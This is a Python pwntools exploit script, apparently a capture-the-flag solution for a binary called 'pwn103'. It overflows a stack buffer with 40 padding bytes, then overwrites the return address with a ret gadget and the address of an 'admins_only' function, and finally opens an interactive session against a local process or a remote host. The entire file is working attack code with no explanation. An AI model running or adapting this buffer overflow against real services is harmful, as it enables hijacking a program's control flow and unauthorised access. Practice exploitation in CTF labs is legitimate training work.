#!/usr/bin/env python

import sys
from pwn import *
from struct import *

elf = ELF('./pwn103.pwn103')

def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([elf] + argv, *a, **kw)

io = start()

exploit  = b''
exploit  += b"\x90"*40
#exploit  += pack("<I", 0x401016)
#exploit  += pack("<I", 0x0000000000401554)

exploit  += p64(0x401016)
exploit  += p64(elf.symbols['admins_only'])

print(io.recv().decode('utf-8'))
io.sendline('3')
print(io.recv().decode('utf-8'))
io.sendlineafter(b"[pwner]:",exploit)
print(io.recv().decode('utf-8'))

io.interactive()
